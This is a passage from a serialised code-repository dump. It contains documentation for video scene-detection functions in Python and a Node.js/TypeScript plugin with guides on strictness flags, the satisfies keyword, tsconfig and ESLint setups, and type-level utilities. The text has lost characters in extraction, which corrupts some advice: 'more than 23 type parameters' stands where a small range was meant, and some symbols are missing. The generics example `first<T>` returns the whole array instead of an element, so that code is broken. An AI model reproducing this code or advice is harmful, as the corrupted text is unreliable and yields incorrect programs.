correlation = cv2.compareHist(hist1, hist2, cv2.HISTCMP_CORREL)\n\n    # Convert to cut score (lower correlation = higher cut score)\n    cut_score = 1.0 - correlation\n\n    return cut_score\n\ndef _detect_cut_advanced(self, frame1: np.ndarray, frame2: np.ndarray) -> float:\n    \"\"\"Advanced cut detection using multiple metrics\"\"\"\n    scores = []\n\n    # 1. Histogram difference\n    hist_score = self._histogram_difference(frame1, frame2)\n    scores.append(hist_score)\n\n    # 2. Structural similarity\n    ssim_score = self._ssim_difference(frame1, frame2)\n    scores.append(ssim_score)\n\n    # 3. Edge change ratio\n    edge_score = self._edge_change_ratio(frame1, frame2)\n    scores.append(edge_score)\n\n    # 4. Color distribution\n    color_score = self._color_distribution_difference(frame1, frame2)\n    scores.append(color_score)\n\n    # Weighted average\n    weights = [0.3, 0.3, 0.2, 0.2]\n    final_score = sum(score * weight for score, weight in zip(scores, weights))\n\n    return final_score\n```\n\n### 2. Fade Detection\n\n**Gradual Transition Detection:**\n```python\ndef _detect_fade(self, frame_buffer: List[np.ndarray]) -> float:\n    \"\"\"Detect gradual transitions (fades, dissolves)\"\"\"\n    if len(frame_buffer) < 5:\n        return 0.0\n\n    # Analyze last 5 frames\n    frames = frame_buffer[-5:]\n    fade_scores = []\n\n    for i in range(1, len(frames)):\n        # Calculate gradual change\n        gray1 = cv2.cvtColor(frames[i-1], cv2.COLOR_BGR2GRAY)\n        gray2 = cv2.cvtColor(frames[i], cv2.COLOR_BGR2GRAY)\n\n        # Calculate absolute difference\n        diff = cv2.absdiff(gray1, gray2)\n        mean_diff = np.mean(diff)\n\n        fade_scores.append(mean_diff / 255.0)\n\n    # Check if gradual increase/decrease\n    if len(fade_scores) >= 3:\n        # Check for gradual trend\n        increasing = all(fade_scores[i] <= fade_scores[i+1] for i in range(len(fade_scores)-1))\n        decreasing = all(fade_scores[i] >= fade_scores[i+1] for i in range(len(fade_scores)-1))\n\n        if increasing or decreasing:\n            # Check magnitude\n            total_change = max(fade_scores) - min(fade_scores)\n            return min(total_change, 1.0)\n\n    return 0.0\n```\n\n### 3. Story Beat Detection\n\n**Narrative Boundary Detection:**\n```python\ndef _detect_story_beats(self, frames: List[np.ndarray], audio_analysis: Dict) -> List[float]:\n    \"\"\"Detect story beats (narrative boundaries)\"\"\"\n    story_beats = []\n\n    # 1. Visual story beats\n    visual_beats = self._detect_visual_story_beats(frames)\n\n    # 2. Audio story beats\n    audio_beats = self._detect_audio_story_beats(audio_analysis)\n\n    # 3. Combined detection\n    all_beats = visual_beats + audio_beats\n    all_beats.sort()\n\n    # Remove beats too close together\n    min_beat_interval = 2.0  # seconds\n    filtered_beats = [all_beats[0]]\n\n    for beat in all_beats[1:]:\n        if beat - filtered_beats[-1] >= min_beat_interval:\n            filtered_beats.append(beat)\n\n    return filtered_beats\n\ndef _detect_visual_story_beats(self, frames: List[np.ndarray]) -> List[float]:\n    \"\"\"Detect visual story beats\"\"\"\n    beats = []\n\n    # Analyze composition changes\n    for i in range(1, len(frames)):\n        composition1 = self._analyze_composition(frames[i-1])\n        composition2 = self._analyze_composition(frames[i])\n\n        # Detect major composition shift\n        if self._composition_changed_dramatically(composition1, composition2):\n            # Estimate timestamp\n            beat_time = i / 30.0  # Assuming 30 fps\n            beats.append(beat_time)\n\n    return beats\n\ndef _detect_audio_story_beats(self, audio_analysis: Dict) -> List[float]:\n    \"\"\"Detect audio-based story beats\"\"\"\n    beats = []\n\n    # Detect tempo changes\n    if 'tempo_changes' in audio_analysis:\n        for tempo_change in audio_analysis['tempo_changes']:\n            beats.append(tempo_change['timestamp'])\n\n    # Detect speech/music transitions\n    if 'speech_segments' in audio_analysis:\n        for segment in audio_analysis['speech_segments']:\n            beats.append(segment['start'])\n\n    return beats\n```\n\n## Accuracy Metrics\n\n### Hard Cut Detection\n- **Threshold**: 0.3 (correlation-based)\n- **Accuracy**: >95% on standard test sets\n- **False Positive Rate**: <2%\n\n### Fade Detection\n- **Threshold**: 0.1 (gradual change)\n- **Accuracy**: >90% for fades >0.5 seconds\n- **Minimum Duration**: 0.5 seconds\n\n### Story Beat Detection\n- **Accuracy**: >85% for narrative boundaries\n- **Combines**: Visual + Audio cues\n- **Minimum Interval**: 2 seconds between beats\n\n## Usage\n\n```python\ndetector = SceneDetector()\n\n# Detect all scenes\nscenes = detector.detect_scenes(\"video.mp4\")\n\nprint(scenes)\n# Output:\n# [\n#     {\n#         'start_frame': 0,\n#         'end_frame': 150,\n#         'start_time': 0.0,\n#         'end_time': 5.0,\n#         'duration': 5.0,\n#         'cut_type': 'hard_cut'\n#     },\n#     ...\n# ]\n```\n\n## Integration Points\n\n- Used by `MultimodalAnalyzer` for scene segmentation\n- Referenced by EDL generation\n- Supports real-time scene detection\n\n## Optimization Strategies\n\n1. **Frame Skipping**: Analyze every Nth frame\n2. **Early Termination**: Stop when cut detected\n3. **GPU Acceleration**: OpenCV CUDA support\n4. **Adaptive Thresholding**: Adjust based on video content\n5. **Multi-Threading**: Parallel frame analysis\n\n## Applications\n\n1. **Automatic Editing**: Scene-based cutting\n2. **Indexing**: Video navigation\n3. **Summarization**: Key scene extraction\n4. **Search**: Scene-level search\n5. **Compression**: Scene-aware encoding\n",
        "plugins/sys-nodejs/.claude-plugin/plugin.json": "{\n    \"name\": \"sys-nodejs\",\n    \"description\": \"NODE.JS/TS RUNTIME DOMAIN - Language-specific tooling for Node.js, TypeScript, Bun, and npm/pnpm/bun package ecosystems\",\n    \"version\": \"1.0.0\",\n    \"license\": \"MIT\",\n    \"author\": {\n        \"name\": \"Git-Fg\"\n    },\n    \"keywords\": [\n        \"nodejs\",\n        \"typescript\",\n        \"bun\",\n        \"javascript\",\n        \"npm\",\n        \"pnpm\",\n        \"type-safety\",\n        \"language\"\n    ]\n}\n",
        "plugins/sys-nodejs/README.md": "# sys-nodejs\n\n**Node.js/TypeScript Runtime** - Language-specific tooling for modern JavaScript/TypeScript development.\n\n## Purpose\n\nProvides specialized tooling for Node.js, TypeScript, Bun, and package management ecosystems (npm/pnpm/bun).\n\n## Skills\n\n- **typescript-advanced-types** - Modern TypeScript type safety, strictness flags, and compile-time optimization\n- **managing-npm** - Protocol-based dependency management for npm, pnpm, and bun (Security audits, lockfile hygiene)\n\n## Usage\n\nLanguage-specific development patterns and configuration management for TypeScript/JavaScript projects.\n",
        "plugins/sys-nodejs/skills/configuring-typescript/SKILL.md": "---\nname: configuring-typescript\ndescription: \"Configures modern TypeScript (4.9+ through 5.x) for maximum type safety with sustainable compile times. Use when designing type-safe configs/maps/APIs, enforcing strictness flags, improving TS build performance (incremental, project references), or setting up separate TS/ESLint configs for tests.\"\n---\n\n# TypeScript Advanced Types\n\nModern TypeScript playbook for writing code that is **correct**, **ergonomic**, and **fast enough**.\n\n## Quick Reference\n\n| Need | See |\n|:-----|-----|\n| Modern features (`satisfies`, `const` type params) | [Modern Features](references/modern-features.md) |\n| Generics, conditional types, mapped types | [Type-Level Toolbox](references/type-level-toolbox.md) |\n| Config objects, event emitters, API clients | [Practical Patterns](references/practical-patterns.md) |\n| Test patterns, tsconfig templates | [Tests & Configs](references/tests-configs.md) |\n| Compile-time optimization | [Performance Playbook](references/performance-playbook.md) |\n| Type testing, PR checklist | [Type Testing](references/type-testing.md) |\n\n## When to Use\n\nUse this skill when:\n- Building **type-safe configs/maps/APIs** (feature flags, route tables, event maps)\n- Designing **type-safe APIs** (HTTP clients, RPC layers, CLI command maps)\n- Enforcing strictness beyond `\"strict\": true`:\n  - `noUncheckedIndexedAccess`\n  - `exactOptionalPropertyTypes`\n  - `verbatimModuleSyntax`\n- Improving compile times (incremental builds, project references)\n- Setting up separate TS/ESLint configs for tests\n\n\n\n## Default Workflow\n\n1. **Start with data shape and ownership**  Is value internally constructed (safe) or external input (unsafe)?\n2. **Choose the lightest typing tool**  `satisfies` for configs, mapped types for transformations, `infer` for function inference\n3. **Lock strictness and hygiene**  Enable `noUncheckedIndexedAccess`, `exactOptionalPropertyTypes`, consider `verbatimModuleSyntax`\n4. **Keep builds fast**  Enable `incremental`, use project references in monorepos, measure with `--extendedDiagnostics`\n5. **Tests: strict where matters, pragmatic where not**  Separate `tsconfig.test.json`, ESLint overrides for test files only\n\n## Key Highlights\n\n### `satisfies`  Use Aggressively\nValidates object shape without losing literal inference or widening to `string`/`number`.\n\n```ts\ntype AppConfig = {\n  env: \"dev\" | \"prod\";\n  apiBaseUrl: string;\n  retries: number;\n};\n\nexport const config = {\n  env: \"dev\",\n  apiBaseUrl: \"https://api.example.com\",\n  retries: 3,\n} satisfies AppConfig;\n// config.env is \"dev\" (literal), not \"dev\" | \"prod\"\n```\n\n### Strictness Beyond `\"strict\": true`\n\n**`noUncheckedIndexedAccess`**  Adds `undefined` to indexed access:\n```ts\nconst dict: Record<string, { id: string }> = {};\nconst x = dict[\"missing\"]; // { id: string } | undefined\n```\n\n**`exactOptionalPropertyTypes`**  Optional  undefined:\n```ts\ntype UserPrefs = { theme?: \"dark\" | \"light\" };\nconst prefs: UserPrefs = {};\nprefs.theme = \"dark\";     // ok\n// prefs.theme = undefined; // error\n```\n\n**`verbatimModuleSyntax`**  Module hygiene:\n```ts\nimport type { User } from \"./types\";     // type-only\nimport { createUser } from \"./runtime\"; // runtime (kept in output)\n```\n\n## Resources\n\nSee [references/](references/) for detailed guides on each topic.\n",
        "plugins/sys-nodejs/skills/configuring-typescript/references/modern-features.md": "# Modern TypeScript Features\n\nHigh-leverage features often missing from \"advanced types\" guides that solve 80% of daily typing problems.\n\n## 1) `satisfies` (Use It Aggressively)\n\n### What problem it solves\nYou want the compiler to check that your object matches an interface/shape, but you do **not** want to lose literal inference (widening to `string`, `number`, etc.), and you want errors to point at the exact mismatched property.\n\n### Canonical config pattern\n```ts\ntype AppConfig = {\n  env: \"dev\" | \"prod\";\n  apiBaseUrl: string;\n  retries: number;\n  features: Record<string, boolean>;\n};\n\nexport const config = {\n  env: \"dev\",\n  apiBaseUrl: \"https://api.example.com\",\n  retries: 3,\n  features: {\n    auth: true,\n    analytics: false,\n  },\n} satisfies AppConfig;\n\n// Still keeps precise inference:\n// - config.env is \"dev\" (literal), not \"dev\" | \"prod\"\n// - config.retries is 3 (literal) if \"as const\" is used\n```\n\n### Map-of-things pattern (routes/events/commands)\n```ts\ntype CommandSpec = {\n  input: unknown;\n  output: unknown;\n};\n\ntype CommandRegistry = Record<string, CommandSpec>;\n\nexport const commands = {\n  \"user.create\": {\n    input: { name: \"string\", email: \"string\" },\n    output: { id: \"string\" },\n  },\n  \"user.delete\": {\n    input: { id: \"string\" },\n    output: { ok: \"boolean\" },\n  },\n} satisfies CommandRegistry;\n\nexport type CommandName = keyof typeof commands;\n```\n\n### When NOT to use `satisfies`\n- When you need to *change* the type of an expression (that's annotation or a function wrapper)\n- When you need runtime validation (external input)\n\n### Anti-patterns vs `satisfies`\n\n**Anti-pattern: `as SomeType` on object literals**\n```ts\n// Bad: hides extra/missing keys and widens inference unexpectedly\nconst cfg = {\n  env: \"dev\",\n  retries: 3,\n} as AppConfig;\n```\n\n**Better: `satisfies`**\n```ts\nconst cfg = {\n  env: \"dev\",\n  retries: 3,\n  apiBaseUrl: \"https://api.example.com\",\n  features: {},\n} satisfies AppConfig;\n```\n\n---\n\n## 2) Strictness Flags Beyond `\"strict\": true`\n\nMany codebases set `\"strict\": true` and stop. That is not enough for maximum safety.\n\n### `noUncheckedIndexedAccess`\nAdds `undefined` to indexed access results. Prevents many \"undefined at runtime\" bugs.\n\n```ts\n// With noUncheckedIndexedAccess: true\nconst dict: Record<string, { id: string }> = {};\nconst x = dict[\"missing\"];\n// x: { id: string } | undefined\n\n// You must handle undefined:\nif (x) {\n  x.id;\n}\n```\n\n**Pragmatic guidance:**\n- Keep enabled for application code\n- In tests, use non-null assertions (`!`) when test setup guarantees existence\n\n### `exactOptionalPropertyTypes`\nOptional does not automatically mean \"can assign undefined.\"\n\n```ts\n// With exactOptionalPropertyTypes: true\ntype UserPrefs = {\n  theme?: \"dark\" | \"light\";\n};\n\nconst prefs: UserPrefs = {};\nprefs.theme = \"dark\";     // ok\n// prefs.theme = undefined; // error unless theme?: \"dark\" | \"light\" | undefined\n```\n\n**Pragmatic guidance:**\n- Enable when optional-vs-undefined semantics should match runtime checks\n- Expect friction with some third-party types\n- Have a strategy: keep `skipLibCheck` on for dev, pin/upgrade types, add explicit `| undefined` where truly allowed\n\n---\n\n## 3) `verbatimModuleSyntax` + `import type` (Module Hygiene)\n\n**Why it matters:**\n- Predictable emitted output\n- Eliminates \"import elision gotchas\"\n- Forces clarity: what's runtime vs type-only\n\n```ts\n// Good: type-only import\nimport type { User } from \"./types\";\n\n// Good: runtime import (kept in output)\nimport { createUser } from \"./runtime\";\n```\n\nWith `verbatimModuleSyntax: true`, any import/export without the `type` modifier is preserved as-is. Treat this as \"what you see is what you get.\"\n\n---\n\n## 4) Variadic Tuple Types (Function Wrappers Done Right)\n\nPreserve argument lists across higher-order utilities.\n\n```ts\ntype AnyFunc = (...args: any[]) => any;\n\nexport function withTiming<F extends AnyFunc>(fn: F) {\n  return (...args: Parameters<F>): ReturnType<F> => {\n    const start = performance.now();\n    try {\n      return fn(...args);\n    } finally {\n      const end = performance.now();\n      console.log(`took ${end - start}ms`);\n    }\n  };\n}\n```\n\n**More advanced: append arguments**\n```ts\nexport function withContext<Args extends any[], R>(\n  fn: (...args: [...Args, { requestId: string }]) => R,\n  ctx: { requestId: string }\n) {\n  return (...args: Args) => fn(...args, ctx);\n}\n```\n\n---\n\n## 5) `Awaited<T>` and Async Type Modeling\n\n`Awaited<T>` models the type you get after `await` (including nested promises).\n\n```ts\ntype T1 = Awaited<Promise<number>>;              // number\ntype T2 = Awaited<Promise<Promise<string>>>;     // string\n\nasync function fetchUser() {\n  return { id: \"1\", name: \"Ada\" };\n}\n\ntype User = Awaited<ReturnType<typeof fetchUser>>;\n// { id: string; name: string }\n```\n\nUse this in:\n- API clients\n- loader functions\n- job queues\n- async adapters\n\n---\n\n## 6) TS 5.x: `const` Type Parameters (Better Literal Inference in APIs)\n\nWhen designing generic APIs that accept objects/arrays and want to preserve literals without requiring `as const`:\n\n```ts\n// Requires TS 5.0+\nexport function defineRoutes<const T extends Record<string, { method: string; path: string }>>(routes: T) {\n  return routes;\n}\n\nexport const routes = defineRoutes({\n  users: { method: \"GET\", path: \"/users\" },\n  user: { method: \"GET\", path: \"/users/:id\" },\n});\n\n// routes.users.method is \"GET\" (literal), not string\n// routes.user.path is \"/users/:id\" (literal), not string\n```\n\nCombine with `satisfies` when also wanting shape validation against a broader contract.\n\n---\n\n## 7) Instantiation Expressions (Generic Specialization Without Calling)\n\nWhen you have a generic function and want to \"pre-bind\" the type parameter:\n\n```ts\ntype Parser<T> = (input: string) => T;\n\nfunction makeParser<T>(): Parser<T> {\n  return (input) => JSON.parse(input) as T;\n}\n\n// You want: a Parser<User> factory without calling yet\nconst userParserFactory = makeParser<User>;\n// Later you can call it:\nconst parseUser = userParserFactory();\n```\n\nNiche but useful for library code and factories.\n",
        "plugins/sys-nodejs/skills/configuring-typescript/references/performance-playbook.md": "# Compile-Time Performance Playbook\n\nWhen compile times degrade, do not guess. Follow this sequence.\n\n---\n\n## 1) Measure, Don't Speculate\n\nRun diagnostics:\n```bash\n# Single package\ntsc -p tsconfig.json --noEmit --extendedDiagnostics\n\n# Monorepo\ntsc -b --noEmit --extendedDiagnostics\n```\n\nRecord:\n- Total time\n- Parse time\n- Bind/check time\n- Number of files\n- Memory usage\n\nKeep a history (CI artifact or local notes) to see regressions.\n\n---\n\n## 2) Stabilize the Typechecking Surface Area\n\n- Use project references to stop TypeScript from re-checking the world on every change\n- Emit `.d.ts` for internal packages (especially shared libs) to reduce cross-package typechecking work\n\n---\n\n## 3) Common Sources of Type Slowness (and Fixes)\n\n### A) Deep recursive types used everywhere\n\n**Symptoms:** Typechecking slows as the codebase grows.\n\n**Fix:**\n- Restrict deep types to boundaries\n- Provide shallow types for internal usage\n- Avoid deep recursion on broad object types\n\n### B) Distributive conditional types over large unions\n\n**Symptoms:** A type like `Foo<A|B|C|...>` becomes huge.\n\n**Fix:**\n- Use non-distributive forms `[T] extends [X] ? ... : ...`\n- Reduce union size earlier\n\n### C) Template literal explosion\n\n**Symptoms:** Route/event key types become enormous.\n\n**Fix:**\n- Keep key unions small\n- Avoid generating huge cross-products of strings\n\n### D) Accidental `any` or `unknown` propagation causing more work\n\nSometimes weak typing increases work because everything becomes \"maybe\" and the checker tries harder.\n\n**Fix:**\n- Keep core types precise\n- Use `satisfies` for maps/configs\n\n---\n\n## 4) Decide Tradeoffs Explicitly\n\n### `skipLibCheck`\n\n**On:** Improves speed by skipping `.d.ts` checks.\n**Off:** Increases correctness across dependency types.\n\n**Policy recommendation:**\n- Dev: usually `true`\n- CI (optional strict job): `false`\n\n### Typed ESLint (`recommended-type-checked`)\n\nValuable but can be slow if misconfigured.\n\n**Policy:**\n- Use `tsconfig.eslint.json` so ESLint has a stable, intentionally scoped project\n- Use overrides to avoid typed rules in config files or scripts if needed\n",
        "plugins/sys-nodejs/skills/configuring-typescript/references/practical-patterns.md": "# Practical Patterns\n\nCopy/paste-ready patterns optimized for strong typing, minimal complexity, good inference, and reasonable compile time.\n\n---\n\n## Pattern 1  Strongly Typed Configuration Objects\n\n### Baseline: `satisfies` + `as const` (literal preservation)\n```ts\ntype FeatureFlags = {\n  auth: boolean;\n  analytics: boolean;\n  betaUI: boolean;\n};\n\nexport const features = {\n  auth: true,\n  analytics: false,\n  betaUI: false,\n} as const satisfies FeatureFlags;\n\n// - satisfies checks shape\n// - as const preserves boolean literals (true/false)\n```\n\n### Prevent extra keys (common config requirement)\nUse `satisfies` against an exact object type rather than an index signature.\n\n```ts\ntype ExactFeatures = {\n  auth: boolean;\n  analytics: boolean;\n};\n\nexport const exact = {\n  auth: true,\n  analytics: false,\n  // extra: true, // error\n} satisfies ExactFeatures;\n```\n\n---\n\n## Pattern 2  Type-Safe Event Emitter (Map-first)\n\n```ts\nexport type EventMap = {\n  \"user:created\": { id: string; name: string };\n  \"user:deleted\": { id: string };\n};\n\nexport class TypedEventEmitter<T extends Record<string, any>> {\n  private listeners: { [K in keyof T]?: Array<(data: T[K]) => void> } = {};\n\n  on<K extends keyof T>(event: K, cb: (data: T[K]) => void): void {\n    (this.listeners[event] ??= []).push(cb);\n  }\n\n  emit<K extends keyof T>(event: K, data: T[K]): void {\n    this.listeners[event]?.forEach((cb) => cb(data));\n  }\n}\n\n// Map literal checked with satisfies (keeps keys precise)\nexport const events = {\n  \"user:created\": null,\n  \"user:deleted\": null,\n} satisfies Record<keyof EventMap, null>;\n```\n\n---\n\n## Pattern 3  Type-Safe API Client (Config-driven)\n\n```ts\nexport type HTTPMethod = \"GET\" | \"POST\" | \"PUT\" | \"DELETE\";\n\nexport type EndpointConfig = {\n  \"/users\": {\n    GET: { response: { id: string; name: string }[] };\n    POST: { body: { name: string; email: string }; response: { id: string } };\n  };\n  \"/users/:id\": {\n    GET: { params: { id: string }; response: { id: string; name: string } };\n    PUT: { params: { id: string }; body: { name?: string }; response: { ok: true } };\n    DELETE: { params: { id: string }; response: { ok: true } };\n  };\n};\n\ntype ExtractParams<T> = T extends { params: infer P } ? P : never;\ntype ExtractBody<T> = T extends { body: infer B } ? B : never;\ntype ExtractResponse<T> = T extends { response: infer R } ? R : never;\n\nexport class APIClient<Config extends Record<string, Record<string, any>>> {\n  async request<Path extends keyof Config, Method extends keyof Config[Path]>(\n    path: Path,\n    method: Method,\n    ...[options]:\n      ExtractParams<Config[Path][Method]> extends never\n        ? ExtractBody<Config[Path][Method]> extends never\n          ? []\n          : [{ body: ExtractBody<Config[Path][Method]> }]\n        : [{\n            params: ExtractParams<Config[Path][Method]>;\n            body?: ExtractBody<Config[Path][Method]>;\n          }]\n  ): Promise<ExtractResponse<Config[Path][Method]>> {\n    // Replace with real fetch logic\n    return {} as any;\n  }\n}\n```\n\n**Guidance:**\n- Keep endpoint config small and modular\n- If EndpointConfig becomes huge, split by feature and merge with `satisfies` to preserve inference\n\n---\n\n## Pattern 4  Builder Pattern with Compile-Time \"Completeness\"\n\nPowerful but can get expensive; use at boundaries where it pays off.\n\n```ts\ntype RequiredKeys<T> = {\n  [K in keyof T]-?: {} extends Pick<T, K> ? never : K\n}[keyof T];\n\ntype IsComplete<T, S> =\n  Exclude<RequiredKeys<T>, keyof S> extends never ? true : false;\n\nexport class Builder<T, S extends Partial<T> = {}> {\n  private state: S = {} as S;\n\n  set<K extends keyof T>(key: K, value: T[K]): Builder<T, S & Pick<T, K>> {\n    (this.state as any)[key] = value;\n    return this as any;\n  }\n\n  build(this: IsComplete<T, S> extends true ? this : never): T {\n    return this.state as T;\n  }\n}\n```\n",
        "plugins/sys-nodejs/skills/configuring-typescript/references/tests-configs.md": "# Tests & Configs\n\nStrong typing without losing debug velocity. Strict in production, pragmatic in tests.\n\n---\n\n## Tests: Strong Typing, Fast Debugging\n\nTests are specialyou often intentionally violate invariants (partial objects, mocks, fake timers). The goal is **targeted pragmatism**: strict in production, adjustable in tests, enforced by config not vibes.\n\n### Recommended directory patterns\n\n**Option 1  Co-located tests**\n- `src/foo.ts`\n- `src/foo.test.ts`\n\n**Option 2  Dedicated tests folder**\n- `src/**`\n- `tests/**`\n\n**Option 3  Monorepo packages**\n- `packages/*/src/**`\n- `packages/*/tests/**` or `packages/*/src/**/*.test.ts`\n\n### Separate tsconfig for tests (always)\n\nCreate `tsconfig.test.json` extending the base config. Add test runner globals/types here only. Keep production tsconfig clean.\n\n**Vitest example:**\n```json\n{\n  \"extends\": \"./tsconfig.base.json\",\n  \"compilerOptions\": {\n    \"noEmit\": true,\n    \"types\": [\"node\", \"vitest/globals\"]\n  },\n  \"include\": [\n    \"src/**/*.test.ts\",\n    \"src/**/*.spec.ts\",\n    \"tests/**/*.ts\"\n  ]\n}\n```\n\nFor Jest, replace `vitest/globals` with appropriate Jest types.\n\n### Pragmatic typing patterns in tests\n\n**Prefer typed factories/builders for fixtures**\n```ts\ntype User = { id: string; name: string; email: string; age?: number };\n\nexport function makeUser(overrides: Partial<User> = {}): User {\n  return {\n    id: \"u_1\",\n    name: \"Test User\",\n    email: \"test@example.com\",\n    ...overrides,\n  };\n}\n```\n\n**Prefer `unknown` + narrowing for untrusted mock payloads**\n```ts\nfunction isUser(x: unknown): x is { id: string; name: string } {\n  return typeof x === \"object\" && x !== null && \"id\" in x && \"name\" in x;\n}\n```\n\n**Use `@ts-expect-error` for negative compile-time tests**\n```ts\ntype Color = \"red\" | \"blue\";\ndeclare const color: Color;\n\n// @ts-expect-error - \"green\" is not assignable\nconst bad: Color = \"green\";\n```\n\n---\n\n## ESLint: Production Strict, Tests Pragmatic\n\nUse ESLint overrides to relax only in tests.\n\n### Option A  Classic `.eslintrc.cjs`\n```js\n/* eslint-env node */\nmodule.exports = {\n  root: true,\n  parser: \"@typescript-eslint/parser\",\n  parserOptions: {\n    tsconfigRootDir: __dirname,\n    project: true\n  },\n  plugins: [\"@typescript-eslint\"],\n  extends: [\n    \"eslint:recommended\",\n    \"plugin:@typescript-eslint/recommended\",\n    \"plugin:@typescript-eslint/recommended-type-checked\"\n  ],\n  rules: {\n    // Enforce type-only imports if using verbatimModuleSyntax\n    \"@typescript-eslint/consistent-type-imports\": [\"error\", { prefer: \"type-imports\" }]\n  },\n  overrides: [\n    {\n      files: [\"**/*.test.ts\", \"**/*.spec.ts\", \"tests/**/*.ts\"],\n      rules: {\n        \"@typescript-eslint/no-explicit-any\": \"off\",\n        \"@typescript-eslint/no-non-null-assertion\": \"off\",\n        \"@typescript-eslint/unbound-method\": \"off\",\n        \"@typescript-eslint/no-unsafe-assignment\": \"off\",\n        \"@typescript-eslint/no-unsafe-member-access\": \"off\",\n        \"@typescript-eslint/no-unsafe-call\": \"off\"\n      }\n    }\n  ]\n};\n```\n\n### Option B  Flat config `eslint.config.js` (modern ESLint)\n\nKeep the same idea: strict typed rules for src, relaxed for tests. Exact package imports vary by ESLint + typescript-eslint versions.\n\n---\n\n## Compiler Configuration (tsconfig): Strict + Fast\n\n### Single-package template (Bun repo)\n\n**`tsconfig.base.json`**\n```json\n{\n  \"compilerOptions\": {\n    \"target\": \"ES2022\",\n    \"module\": \"ESNext\",\n\n    \"strict\": true,\n    \"noUncheckedIndexedAccess\": true,\n    \"exactOptionalPropertyTypes\": true,\n\n    \"verbatimModuleSyntax\": true,\n\n    \"skipLibCheck\": true,\n\n    \"forceConsistentCasingInFileNames\": true,\n    \"noFallthroughCasesInSwitch\": true,\n    \"noImplicitOverride\": true\n  }\n}\n```\n\n**`tsconfig.json`** (production/dev typecheck)\n```json\n{\n  \"extends\": \"./tsconfig.base.json\",\n  \"compilerOptions\": {\n    \"noEmit\": true,\n    \"types\": [\"node\"]\n  },\n  \"include\": [\"src/**/*.ts\", \"src/**/*.tsx\"]\n}\n```\n\n**`tsconfig.test.json`** (test-only)\n```json\n{\n  \"extends\": \"./tsconfig.base.json\",\n  \"compilerOptions\": {\n    \"noEmit\": true,\n    \"types\": [\"node\", \"vitest/globals\"]\n  },\n  \"include\": [\"src/**/*.test.ts\", \"src/**/*.spec.ts\", \"tests/**/*.ts\"]\n}\n```\n\n**`tsconfig.eslint.json`** (optional, for typed lint stability)\n```json\n{\n  \"extends\": \"./tsconfig.base.json\",\n  \"compilerOptions\": {\n    \"noEmit\": true\n  },\n  \"include\": [\n    \"src/**/*.ts\",\n    \"src/**/*.tsx\",\n    \"tests/**/*.ts\",\n    \"*.ts\",\n    \"*.js\",\n    \"*.cjs\",\n    \"*.mjs\"\n  ]\n}\n```\n\n**`package.json` scripts** (example)\n```json\n{\n  \"scripts\": {\n    \"typecheck\": \"bunx tsc -p tsconfig.json\",\n    \"typecheck:tests\": \"bunx tsc -p tsconfig.test.json\",\n    \"lint\": \"bunx eslint .\",\n    \"test\": \"bunx vitest run\"\n  }\n}\n```\n\n### pnpm monorepo template (Project References)\n\n**Why project references:** Enable scalable incremental builds by splitting packages into composite projects and building with `tsc -b`.\n\n**Root layout:**\n- `tsconfig.base.json`\n- `tsconfig.json` (references graph)\n- `tsconfig.eslint.json` (optional)\n- `packages/*/tsconfig.json`\n- `packages/*/tsconfig.test.json`\n\n**Root `tsconfig.base.json`**\n```json\n{\n  \"compilerOptions\": {\n    \"target\": \"ES2022\",\n    \"module\": \"ESNext\",\n\n    \"strict\": true,\n    \"noUncheckedIndexedAccess\": true,\n    \"exactOptionalPropertyTypes\": true,\n\n    \"verbatimModuleSyntax\": true,\n    \"skipLibCheck\": true,\n\n    \"forceConsistentCasingInFileNames\": true\n  }\n}\n```\n\n**Root `tsconfig.json`** (references)\n```json\n{\n  \"files\": [],\n  \"references\": [\n    { \"path\": \"./packages/core\" },\n    { \"path\": \"./packages/api\" }\n  ]\n}\n```\n\n**Package `packages/core/tsconfig.json`**\n```json\n{\n  \"extends\": \"../../tsconfig.base.json\",\n  \"compilerOptions\": {\n    \"composite\": true,\n    \"incremental\": true,\n\n    \"rootDir\": \"./src\",\n    \"outDir\": \"./dist\",\n\n    \"declaration\": true,\n    \"declarationMap\": true,\n    \"emitDeclarationOnly\": true\n  },\n  \"include\": [\"src/**/*.ts\"]\n}\n```\n\n**Package test `packages/core/tsconfig.test.json`**\n```json\n{\n  \"extends\": \"./tsconfig.json\",\n  \"compilerOptions\": {\n    \"noEmit\": true,\n    \"types\": [\"node\", \"vitest/globals\"]\n  },\n  \"include\": [\"src/**/*.test.ts\", \"src/**/*.spec.ts\", \"tests/**/*.ts\"]\n}\n```\n\n**Root scripts**\n```json\n{\n  \"scripts\": {\n    \"typecheck\": \"tsc -b --noEmit\",\n    \"build\": \"tsc -b\",\n    \"typecheck:watch\": \"tsc -b -w --noEmit\"\n  }\n}\n```\n",
        "plugins/sys-nodejs/skills/configuring-typescript/references/type-level-toolbox.md": "# Type-Level Toolbox\n\nClassical \"advanced types\" section, tuned for correctness and performance.\n\n## A) Generics\n\n### Use generics to express *relationships* between values and types\n```ts\nexport function first<T>(items: readonly T[]): T | undefined {\n  return items;\n}\n```\n\n### Prefer constraints over `any`\n```ts\ntype HasId = { id: string };\n\nexport function byId<T extends HasId>(items: readonly T[], id: string): T | undefined {\n  return items.find((x) => x.id === id);\n}\n```\n\n### Avoid \"generic soup\"\nIf you have more than 23 type parameters, it may be a smell:\n- Can you derive one from another?\n- Can you use an object type parameter instead?\n\n---\n\n## B) Conditional Types\n\n### Control distributivity (very important for performance)\n\nConditional types distribute over unions by default:\n```ts\ntype ToArray<T> = T extends any ? T[] : never;\ntype X = ToArray<string | number>; // string[] | number[]\n```\n\nTo avoid distributive behavior, wrap in tuples:\n```ts\ntype ToArrayNonDist<T> = [T] extends [any] ? T[] : never;\ntype Y = ToArrayNonDist<string | number>; // (string | number)[]\n```\n\n**Use non-distributive forms when unions can get large.**\n\n### `infer` for extraction\n```ts\ntype ElementType<T> = T extends readonly (infer U)[] ? U : never;\ntype PType<T> = T extends Promise<infer U> ? U : never;\ntype FnReturn<T> = T extends (...args: any[]) => infer R ? R : never;\n```\n\n---\n\n## C) Mapped Types\n\n### Key remapping and filtering\n```ts\ntype PickByValue<T, V> = {\n  [K in keyof T as T[K] extends V ? K : never]: T[K]\n};\n\ntype OptionalKeys<T> = {\n  [K in keyof T]-?: {} extends Pick<T, K> ? K : never\n}[keyof T];\n```\n\n### Deep utilities (use carefully; can get expensive)\n```ts\nexport type DeepReadonly<T> =\n  T extends Function ? T :\n  T extends readonly (infer U)[] ? readonly DeepReadonly<U>[] :\n  T extends object ? { readonly [K in keyof T]: DeepReadonly<T[K]> } :\n  T;\n\nexport type DeepPartial<T> =\n  T extends Function ? T :\n  T extends readonly (infer U)[] ? DeepPartial<U>[] 